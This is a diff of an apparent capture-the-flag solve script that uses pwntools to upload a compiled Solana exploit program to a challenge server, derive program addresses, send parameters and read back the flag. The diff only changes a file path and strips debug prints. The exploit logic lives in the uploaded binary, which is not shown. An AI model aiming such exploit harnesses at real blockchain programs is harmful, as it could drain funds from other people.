@@ -12,26 +12,19 @@ host = args.HOST or 'localhost'
 port = args.PORT or 5001
 
 r = remote(host, port)
-solve = open('target/debug/libmoar_horse_solve.so', 'rb').read()
+solve = open('target/deploy/moar_horse_solve.so', 'rb').read()
 r.recvuntil(b'program pubkey: ')
 r.sendline(b'5PjDJaGfSPJj4tFzMRCiuuAasKg5n8dJKXKenhuwZexx')
 r.recvuntil(b'program len: ')
 r.sendline(str(len(solve)).encode())
 r.send(solve)
 
-print("sent!")
-
 r.recvuntil(b'program: ')
-# print("@@", r.recvline().strip().decode())
-# print("@@", r.recvline().strip().decode())
 program = PublicKey(base58.b58decode(r.recvline().strip().decode()))
 r.recvuntil(b'user: ')
-print("here!")
 user = PublicKey(base58.b58decode(r.recvline().strip().decode()))
 horse, horse_bump = PublicKey.find_program_address([b'HORSE'], program)
 wallet, wallet_bump = PublicKey.find_program_address([b'WALLET', bytes(user)], program)
-
-print("here2")
 
 r.sendline(b'5')
 print("PROGRAM=", program)
@@ -44,7 +37,6 @@ print("WALLET=", wallet)
 r.sendline(b'w ' + str(wallet).encode())
 print("HORSE_BUMP=", ID)
 r.sendline(b'x ' + str(ID).encode())
-
 r.sendline(b'0')
 
 r.recvuntil(b'Flag: ')
